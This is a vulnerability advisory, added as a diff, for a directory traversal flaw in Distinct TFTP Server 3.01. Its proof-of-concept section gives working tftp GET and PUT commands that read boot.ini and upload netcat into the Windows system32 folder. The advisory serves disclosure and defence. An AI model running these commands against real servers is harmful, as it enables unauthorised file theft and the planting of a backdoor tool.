@@ -1,0 +1,70 @@
+# Exploit Title: Distinct TFTP Server <= 3.01 Directory Traversal Vulnerability
+# Date: April 8, 2012
+# Software Link: http://www.distinct.com/index.php/downloads/index/p=ISERV
+# Affected Versions: 3.01 and previous version may also affected
+# Tested on: Windows XP SP3, Windows Server 2003 , Windows 7 SP1
+
+Software Description
+--------------------
+Distinct Intranet Servers, which includes FTP Server, TFTP, LPD, BOOTP and NFS, bring quality server power to your network with no additional hardware investment. These servers allow you to make use of your PCs to share important services among your users. 
+
+Vulnerability Details
+---------------------
+The vulnerability is caused due to improper validation to GET and PUT Request containing dot dot slash ('../') sequences, which allows attackers to read or write arbitrary files.
+
+Attack Vector
+-------------
+By requesting a dot dot slash within the GET or PUT request, it is possible to retrieve operating system file such as boot.ini or upload file (errh, nc.exe?) to Windows %systemroot% (C:\WINDOWS\system32\).
+
+Impact
+------
+Read and write files from remote machine.
+
+Proof of Concept
+----------------
+We assume that the directory is deep enough, so you have to set a deep path on the server configuration. If a GET request followed with '../../' (dot dot slash), trying to retrieve boot.ini file, is sent to Distinct TFTP Server 3.01, the file will be retrieved successfully.
+
+hell:~ modpr0be$ tftp -e 10.211.55.5 69
+tftp> get ../../../../../../../../../../../../../boot.ini
+Received 211 bytes in 0.0 seconds
+tftp> 
+
+Next, if we try to upload a file, let say Netcat (nc.exe), to Windows %systemroot% directory (C:\WINDOWS\system32\) using a PUT command, here is the result:
+
+hell:~ modpr0be$ tftp -e 10.211.55.5 69
+tftp> put /Pentest/backdoor/nc.exe ../../../../../../../../../../../../../../../Windows/system32/nc.exe
+Sent 59392 bytes in 0.3 seconds
+tftp>
+
+Netcat successfully uploaded.
+
+Another combinations:
+tftp> get ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+tftp> put /Pentest/backdoor/nc.exe ..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\system32\nc.exe
+
+Solution Status
+---------------
+Unavailable
+
+Risk Factor
+-----------
+CVSS Base Score			= 6.4 (AV:N/AC:L/Au:N/C:P/I:P/A:N)
+    Exploitability Subscore	= 10
+    Impact Subscore		= 4.9
+CVSS Temporal Score		= 5.2
+Overall CVSS Score		= 5.8
+Risk factor			= Medium
+
+Credits
+-------
+Tom Gregory from Spentera Research
+
+References
+----------
+http://www.spentera.com/advisories/2012/SPN-01-2012.pdf
+
+Disclosure Timeline
+-------------------
+March 28, 2012, issue discovered
+March 28, 2012, vendor contacted about the issue, no response
+April 9, 2012, public advisory released
